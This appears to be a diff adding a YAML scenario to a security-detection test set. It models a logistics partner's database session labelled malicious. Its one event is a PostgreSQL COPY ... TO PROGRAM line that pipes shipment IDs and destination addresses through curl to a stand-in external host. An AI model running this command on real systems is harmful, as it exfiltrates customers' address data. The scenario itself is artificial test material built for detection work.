@@ -1,0 +1,21 @@
+scenario_id: logistics_copyprog_mal_01
+family_id: logistics_copy_to_program_shipments
+domain: logistics
+matched_pair_id: logistics_copyprog_pair_01
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content]
+time_of_day: "02:40"
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+  - session_label: exfil
+    role: partner_etl_service
+    anchor: db
+    timing:
+      tempo: steady
+      step_gaps_seconds: [5.0]
+    events:
+      - step_id: dump
+        sql: "COPY (SELECT shipment_id, dest_address FROM shipments) TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest -d @-'"
+        connects_to: {ip: "194.147.78.10", port: 443}
